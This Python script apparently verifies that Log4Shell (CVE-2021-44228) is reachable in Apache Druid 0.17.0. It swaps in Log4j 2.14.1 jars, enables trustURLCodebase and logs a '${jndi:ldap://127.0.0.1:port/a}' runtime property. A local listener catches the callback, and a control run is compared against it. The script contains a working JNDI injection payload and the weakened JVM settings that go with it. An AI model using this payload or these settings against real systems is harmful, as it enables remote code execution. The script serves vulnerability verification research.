#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import signal
import socket
import subprocess
import tarfile
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_druid_0_17_0_v1_log4j_real_entrypoint"
ARCHIVE_NAME = "apache-druid-0.17.0-bin.tar.gz"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
LOG4J_CACHE = LEGACY_ROOT / "historical-scan" / "maven-log4j-2.14.1"
ARCHIVE = LEGACY_ROOT / "historical-scan" / ARCHIVE_NAME
V1_RUNTIME_JARS = {"log4j-api-2.14.1.jar", "log4j-core-2.14.1.jar"}
LOG4J_JARS = {
    "log4j-api-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
    "log4j-slf4j-impl-2.14.1.jar": LOG4J_CACHE / "log4j-slf4j-impl-2.14.1.jar",
    "log4j-1.2-api-2.14.1.jar": LOG4J_CACHE / "log4j-1.2-api-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_core(jar_path):
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "jndi_lookup_class_present": False,
        "jndi_manager_class_present": False,
        "version_2_14_1": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_lookup_class_present"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["jndi_manager_class_present"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
        props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
        if props in names:
            result["version_2_14_1"] = "version=2.14.1" in zf.read(props).decode("utf-8", "replace")
    return result


def replace_log4j(dist):
    lib = dist / "lib"
    before = sorted(p.name for p in lib.glob("log4j-*.jar"))
    copied = {}
    for target_name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        artifact = target_name.rsplit("-", 1)[0]
        for old in lib.glob(f"{artifact}-*.jar"):
            old.unlink()
        target = lib / target_name
        shutil.copy2(source, target)
        copied[target_name] = {
            "source": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target": sha256(target),
            "is_generated_v1_runtime_jar": target_name in V1_RUNTIME_JARS,
        }
    after = sorted(p.name for p in lib.glob("log4j-*.jar"))
    return {
        "before": before,
        "copied": copied,
        "after": after,
        "log4j_core": inspect_core(lib / "log4j-core-2.14.1.jar"),
    }


def ensure_druid(evidence_dir):
    run_root = evidence_dir / "base-runtime"
    if run_root.exists():
        shutil.rmtree(run_root)
    run_root.mkdir(parents=True)
    if not ARCHIVE.exists():
        raise FileNotFoundError(ARCHIVE)
    with tarfile.open(ARCHIVE, "r:gz") as tar:
        tar.extractall(run_root)
    dist = run_root / "apache-druid-0.17.0"
    for script in (dist / "bin").glob("*"):
        script.chmod(script.stat().st_mode | 0o111)
    return dist, replace_log4j(dist)


def start_listener(evidence_dir, case_name, timeout=25):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-listener-port.txt").write_text(str(port_box["port"]), encoding="utf-8")
            ready.set()
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    conn, addr = sock.accept()
                except socket.timeout:
                    return
                with conn:
                    data = conn.recv(256)
                    received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})
                    try:
                        conn.sendall(bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0]))
                    except OSError:
                        pass
                if received:
                    return

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"{case_name} listener did not start")
    return port_box["port"], received, thread


def stop_process(proc):
    if proc.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait(timeout=8)
    except Exception:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            proc.wait(timeout=5)
        except Exception:
            pass


def dependency_evidence(dist, evidence_dir, replacement):
    jars = sorted(str(p.relative_to(dist)) for p in dist.glob("lib/log4j-*.jar"))
    result = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache Druid 0.17.0 binary with "
            "generated v1 Log4j 2.14.1 api/core jars copied from .m2-poc into lib, plus "
            "auxiliary Log4j bridge jars copied from the legacy cache"
        ),
        "runtime_replacement": replacement,
        "runtime_log4j_jars_after_insertion": jars,
        "jndi_lookup_class_present": replacement["log4j_core"]["jndi_lookup_class_present"],
        "jndi_manager_class_present": replacement["log4j_core"]["jndi_manager_class_present"],
    }
    (evidence_dir / "dependency-evidence.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "dependency-evidence.txt").write_text(
        "\n".join(jars)
        + f"\nJndiLookup.class={result['jndi_lookup_class_present']}\n"
        + f"JndiManager.class={result['jndi_manager_class_present']}\n",
        encoding="utf-8",
    )
    return result


def prepare_run_dir(dist, evidence_dir, case_name, payload=None):
    run_dir = evidence_dir / f"{case_name}-run-dist"
    if run_dir.exists():
        shutil.rmtree(run_dir)
    shutil.copytree(dist, run_dir)
    common = run_dir / "conf" / "druid" / "single-server" / "nano-quickstart" / "_common" / "common.runtime.properties"
    text = common.read_text(encoding="utf-8")
    text = text.replace(
        'druid.extensions.loadList=["druid-hdfs-storage", "druid-kafka-indexing-service", "druid-datasketches"]',
        'druid.extensions.loadList=[]',
    )
    text = text.replace("druid.zk.service.host=localhost", "druid.zk.service.host=127.0.0.1")
    text += "\n# Added by strict dynamic verifier through Druid runtime properties.\n"
    text += f"druid.probe.payload={payload if payload else 'control'}\n"
    common.write_text(text, encoding="utf-8")

    jvm = run_dir / "conf" / "druid" / "single-server" / "nano-quickstart" / "broker" / "jvm.config"
    jvm_text = jvm.read_text(encoding="utf-8")
    jvm_text += (
        "\n-Dlog4j2.formatMsgNoLookups=false\n"
        "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true\n"
        "--add-opens java.base/java.lang=ALL-UNNAMED\n"
    )
    jvm.write_text(jvm_text, encoding="utf-8")
    return run_dir


def run_case(dist, evidence_dir, case_name, with_payload, timeout=30):
    port, received, thread = start_listener(evidence_dir, case_name)
    payload = "${jndi:ldap://127.0.0.1:%d/a}" % port
    run_dir = prepare_run_dir(dist, evidence_dir, case_name, payload if with_payload else None)
    cmd = [
        str(run_dir / "bin" / "run-druid"),
        "broker",
        str(run_dir / "conf" / "druid" / "single-server" / "nano-quickstart"),
    ]
    env = os.environ.copy()
    env["JAVA_TOOL_OPTIONS"] = ""
    started = time.time()
    proc = subprocess.Popen(
        cmd,
        cwd=str(run_dir),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        preexec_fn=os.setsid,
    )
    chunks = []
    deadline = time.time() + timeout
    try:
        while time.time() < deadline:
            if proc.poll() is not None:
                break
            line = proc.stdout.readline() if proc.stdout else ""
            if line:
                chunks.append(line)
            if received:
                break
        time.sleep(2)
    finally:
        stop_process(proc)
    if proc.stdout:
        try:
            rest = proc.stdout.read()
            if rest:
                chunks.append(rest)
        except Exception:
            pass
    thread.join(5)
    output = "".join(chunks)
    result = {
        "case": case_name,
        "cmd": cmd,
        "duration_seconds": round(time.time() - started, 3),
        "payload": payload if with_payload else None,
        "received": received,
        "received_count": len(received),
        "returncode": proc.poll(),
        "stdout_contains_startup_logging": "Starting up with processors" in output or "druid.probe.payload" in output,
        "stdout_contains_probe_key": "druid.probe.payload" in output,
        "stdout_contains_payload": payload in output if with_payload else False,
        "stdout_tail": output[-12000:],
    }
    (evidence_dir / f"{case_name}.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return result


def main():
    global ROOT
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    ROOT = Path(args.workdir)
    sample_dir = ROOT / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    if args.fresh and evidence_dir.exists():
        shutil.rmtree(evidence_dir)
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")

    dist, replacement = ensure_druid(evidence_dir)
    dep = dependency_evidence(dist, evidence_dir, replacement)
    positive = run_case(dist, evidence_dir, "broker_runtime_property_payload", True)
    negative = run_case(dist, evidence_dir, "broker_runtime_property_control", False)

    confirmed = (
        all(
            name in replacement["copied"]
            and replacement["copied"][name]["is_generated_v1_runtime_jar"]
            for name in V1_RUNTIME_JARS
        )
        and replacement["log4j_core"]["version_2_14_1"]
        and dep["jndi_lookup_class_present"]
        and dep["jndi_manager_class_present"]
        and positive["received_count"] > 0
        and positive["stdout_contains_startup_logging"]
        and positive["stdout_contains_probe_key"]
        and positive["stdout_contains_payload"]
        and negative["received_count"] == 0
        and negative["stdout_contains_startup_logging"]
        and negative["stdout_contains_probe_key"]
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/druid",
        "downstream_application": "Apache Druid 0.17.0",
        "downstream_entrypoint": "bin/run-druid broker real startup logging",
        "downstream": "Apache Druid 0.17.0",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(ARCHIVE),
        "dependency_evidence": dep,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "attack_surface": "Druid broker startup via `bin/run-druid broker` with a user-controlled runtime property logged by Druid startup logging",
        "payload": positive["payload"],
        "dynamic_signal": {
            "positive_listener_received_count": positive["received_count"],
            "positive_listener_received": positive["received"],
            "positive_returncode": positive["returncode"],
            "positive_startup_logging": positive["stdout_contains_startup_logging"],
            "positive_probe_key_logged": positive["stdout_contains_probe_key"],
            "positive_payload_logged": positive["stdout_contains_payload"],
            "negative_listener_received_count": negative["received_count"],
            "negative_returncode": negative["returncode"],
            "negative_startup_logging": negative["stdout_contains_startup_logging"],
            "negative_probe_key_logged": negative["stdout_contains_probe_key"],
            "generated_v1_jars_inserted": all(name in replacement["copied"] for name in V1_RUNTIME_JARS),
            "jndi_lookup_class_present": dep["jndi_lookup_class_present"],
            "jndi_manager_class_present": dep["jndi_manager_class_present"],
        },
        "positive": {
            "listener_received_count": positive["received_count"],
            "listener_received": positive["received"],
            "startup_logging": positive["stdout_contains_startup_logging"],
            "probe_key_logged": positive["stdout_contains_probe_key"],
            "payload_logged": positive["stdout_contains_payload"],
        },
        "negative": {
            "listener_received_count": negative["received_count"],
            "startup_logging": negative["stdout_contains_startup_logging"],
            "probe_key_logged": negative["stdout_contains_probe_key"],
        },
        "cases": [positive, negative],
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_druid_log4j_v1_inserted.py"),
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts the generated v1 Log4j "
            "api/core 2.14.1 runtime jars into an isolated Druid distribution and triggers "
            "Log4Shell through Druid's real broker startup logging path."
        ),
    }
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_listener_received_count={positive['received_count']}\n"
        f"negative_listener_received_count={negative['received_count']}\n"
        f"jndi_lookup_class_present={int(dep['jndi_lookup_class_present'])}\n"
        f"jndi_manager_class_present={int(dep['jndi_manager_class_present'])}\n"
        f"positive_startup_logging={int(positive['stdout_contains_startup_logging'])}\n"
        f"positive_probe_key_logged={int(positive['stdout_contains_probe_key'])}\n"
        f"positive_payload_logged={int(positive['stdout_contains_payload'])}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache Druid 0.17.0 "
        "binary into an isolated runtime and copies generated v1 Log4j 2.14.1 `api` and `core` jars "
        "from `.m2-poc` into `lib`, with auxiliary Log4j bridge jars from the legacy cache.\n\n"
        "The positive run executes `bin/run-druid broker` with a Druid runtime property set to "
        "`${jndi:ldap://127.0.0.1:<port>/a}`; Druid startup logging prints that property and Log4j "
        "evaluates it. The negative run uses the same startup path with a control value and receives no callback.\n\n"
        "Run: `python3 scripts/verify_druid_log4j_v1_inserted.py` from `/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
